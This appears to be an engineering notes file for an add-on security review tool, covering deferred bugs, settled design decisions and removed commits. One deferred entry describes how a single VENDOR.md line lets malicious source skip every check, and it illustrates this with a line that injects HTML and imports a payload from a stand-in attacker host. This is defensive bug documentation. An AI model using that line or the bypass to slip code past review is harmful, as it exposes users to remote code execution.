# Open work

## The recurring cause (read this first)

Every defect in the purged work was one habit: **deriving a value from a shared
structure without tracing who else reads or writes it, and when.** Tests missed all of
them because they asserted the new code's own output rather than what a consumer saw.
Assert what the consumer sees.

## Open, most important first

## Deferred

- rethink downgrade mode, we can only downgrade if the XPI is including all trusted remote libs 1:1 - a rollup cannot work

- **In SCA mode one VENDOR line exempts a file from EVERY source check.** Its own
  commit; pre-existing (identical at `a02b74b`, `ddbd5c3` and HEAD), unrelated to the
  vendor and lane work around it. Not a false-rejection bug - a review bypass.

  Verified, SCA mode retained, the only difference a one-line `VENDOR.md` in the
  SOURCE tree naming a package that does not exist:

      lib/evil.js:  el.innerHTML = data;  import("https://evil.example.com/payload.js")

      no VENDOR in source      -> unsafe-html, remote-resources (ERROR), icon info
      one VENDOR line in source -> icon info

  So it is not only a minified blob escaping `minified-code`, which is how this entry
  first read. READABLE, actively malicious code escapes every source-level check,
  including error-level ones, and nothing is fetched to earn it - the URL need only
  parse as trusted and pinned.

  Cause (`pipeline.js`, the SCA branch of Phase 3): `resolveVendor` runs on the source addon, `verifyVendor`
  never does - SCA gets `verifyScaDependencies`, which reads package.json alone. A
  trusted+pinned entry therefore produces NO `vendor.results` row, so
  `applyUnverifiedVendor` has nothing to reconcile, while `isVendored` -> `nonAuthored`
  keeps the file out of every scanner. Self-certifying by construction.

  One subtlety when reproducing: the review must STAY in SCA mode. If the shipped XPI
  is directly reviewable the pipeline downgrades to an XPI review (`sca-not-required`)
  and the source tree's VENDOR file never applies - the first fixture I built missed
  the bug that way.

  Second, silent instance of the same class: an AMBIGUOUS source (one URL, two files)
  keeps its paths in `vendor.set` while splicing the entry out of the manifest
  (`resolve.js:277`), so no results row is ever written for them either. In XPI mode
  `vendor-ambiguous-source` is an error and contains it; in SCA that check is
  `sca: false`, so the files are exempt and never named.

  An SCA is not supposed to carry a VENDOR file at all: `verify.js` says "the source
  archive's package.json is the only dependency manifest (no VENDOR.md...)", while
  `pipeline.js` describes the same call as "package.json deps + any VENDOR
  declarations". One function, two modes, two comments, one of them wrong - and the
  wrong one is what honours the file. Fix in that direction: in SCA mode a declaration
  exempts nothing. Then there is nothing to verify because nothing is claimed, and the
  offline vendor checks stay `sca: false` for a reason rather than by inheritance. The
  developer-facing consequence is the right one: a library committed into a source
  archive must be readable, which is what a source archive is for. Consider saying so
  (an info) rather than ignoring the file silently.

- **No golden covers a VERIFIED vendored file.** The golden harness injects a transport
  that refuses everything (`OFFLINE_NET`), so `outcome: "verified"` is unreachable there
  and the whole verified path - not just this lane - is unit-tested only. A
  per-fixture `vendor-net.js` would cover it.

## Decided - do not re-litigate

- **Only popular libraries are trusted; everything else is the developer's own work**
  and gets the full review every other file in the submission gets. That is the base
  concept, not a threshold to tune. So `verified` (which ends
  `isPopular(...) ? "verified" : "not-popular"` on all four verification paths) IS the
  right test for "this line is not the developer's", and the questions that follow from
  it are answered by it: that the popularity bar decides whether a remote load is a
  reject or a reviewer judgement is the point, and a content match against a popular
  package's published file is trusted whether or not the developer declared it - the
  bytes are that library's either way. See [[the JS lane's vendored skip]] below for the
  one place the same conclusion is reached by declaration instead.


- **The JSON report is an upload filter, and carries only what we are 100% sure of.**
  A machine reads it and can REJECT a submission outright, so an add-on rejected there
  never reaches a reviewer. `formatJson` therefore omits `meta.manualReview` by design
  and the exit code counts findings only. Moving a case from a finding to manual review
  is not a lost signal - it is how the submission stops being auto-rejected and reaches
  a person instead. Do not "restore" such an item to the JSON as an info finding: that
  puts something uncertain into the filter, which is the one thing it must not carry.


- **Vendor sources compare as written**, never normalised. Normalising caused a
  verification bypass (`http://` first won the collapse, so the file was never fetched)
  and a false positive (unpkg `?module` serves different bytes from the same path).

- **One file, one source.** A path declared twice with different URLs refuses the
  whole file: keeping either would leave the other unverified with nothing said about
  it. An identical repeat is not a contradiction and collapses to one entry.

- **A declared path is a path from the package root.** A bare filename means that file
  at the root; the parser does not hunt for it by basename. Not finding it is reported
  by `missing-vendor-file`, not repaired by guessing.

- **The JS lane's vendored skip stays declaration-based**, not verification-based. A
  declared-but-unverified file is already gated by `vendor-modified`,
  `unpinned-vendor-source` and `vendor-unverified`, so the declaration alone never gets
  anything past review.

## Not needed - do not re-report

An audit will find these and call them gaps. They were looked at and judged not
worth the change. Re-raising one costs a round trip, so the reasoning is here.

- **The CLI exit code is unpinned between 0 and 1.** `cli.js` ends
  `return hasErrors(result.findings) ? 1 : 0`, and mutating it to a constant `0`
  or `1` passes the whole suite. A mutation audit will report this as the
  highest-consequence trivially-true assertion, because JSON is an upload filter
  and a wrong exit code auto-rejects everything or nothing.

  It is correct today, and consequence is not likelihood: one obvious expression,
  in one file, that nothing else reads. `cli.test.js` does assert the code is one
  of `[0, 1]`, so a crash or a stray `return 2` is still caught - only the 0-vs-1
  discrimination is open. Contrast the severity map, which IS pinned: severity is
  edited routinely and governed 22 checks that fire in no fixture, so it was a live
  gap in something we touch. This is neither. Add the two assertions (`clean` -> 0,
  `all-checks` -> 1) only if that line is ever restructured.

## Where the removed work went

`20d8c79`, `e60702c`, `1e339c6` and `e11723b` are off the branch and reachable by hash
in the reflog; `backup/pre-split` (`95a84f3`) holds the earlier vendor variant. Nothing
is lost, only unshipped. The branch has been rewritten several times since (amends that
folded each audit fix into the commit it corrects), so those hashes resolve through the
reflog rather than by walking the branch.
